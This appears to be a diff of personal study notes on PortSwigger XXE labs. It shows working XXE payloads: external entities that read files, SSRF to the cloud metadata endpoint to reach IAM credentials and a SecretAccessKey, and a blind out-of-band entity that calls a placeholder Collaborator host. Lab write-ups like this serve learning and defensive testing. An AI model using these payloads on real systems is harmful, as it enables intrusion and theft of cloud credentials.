@@ -1,4 +1,4 @@
-## **1. Exploiting XXE using external entities to retrieve files**
+"## **1. Exploiting XXE using external entities to retrieve files**
 This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.
 1. Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
 2. Insert the following external entity definition in between the XML declaration and the `stockCheck` element:
@@ -32,8 +32,9 @@ To solve the lab, exploit the [XXE](https://portswigger.net/web-security/xxe) 
 3. Replace the `productId` number with a reference to the external entity: `&xxe;`. The response should contain "Invalid product ID:" followed by the response from the metadata endpoint, which will initially be a folder name.
 4. Iteratively update the URL in the DTD to explore the API until you reach `/latest/meta-data/iam/security-credentials/admin`. This should return JSON containing the `SecretAccessKey`.
 
-
 Analysis:
+
+- following xml error we will append directories in our server request 
 http://169.254.169.254/
 http://169.254.169.254/latest
 http://169.254.169.254/latest/meta-data
@@ -56,7 +57,7 @@ http://169.254.169.254/latest/meta-data/iam/security-credentials/admin
 
 ```
 ?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE test [ <!ENTITY paein SYSTEM "http://169.254.169.254/latest.../security-credentials/admin"> ]>
+<!DOCTYPE test [ <!ENTITY paein SYSTEM "http://169.254.169.254/latest.../.../admin"> ]>
 <stockCheck>
 	<productId>
 		&paein;
@@ -100,3 +101,32 @@ def main():
 ```
 
 ## **3. Blind XXE with out-of-band interaction**
+This lab has a "Check stock" feature that parses XML input but does not display the result.
+You can detect the [blind XXE](https://portswigger.net/web-security/xxe/blind) vulnerability by triggering out-of-band interactions with an external domain.
+To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.
+
+Analysis:
+
+- testing for XXE vulnerability (using internal XXE)
+![[Pasted image 20240927012427.png]]
+
+- we will try an external XXE (same response)
+![[Pasted image 20240927012657.png]]
+
+- we observe that we are in a blind XXE injection case (out of band) so we will use an external server in order to obtain a DNS lookup (we have to use burp collaborator)
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [<!ENTITY nbyte SYSTEM "http://BurpCollaboratorServer">]>
+<stockCheck>
+	<productId>
+		&nbyte;
+	</productId>
+	<storeId>
+		1
+	</storeId>
+</stockCheck>
+```
+
+![[Pasted image 20240927013218.png]]
+
+# **4. Blind XXE with out-of-band interaction via XML parameter entities**
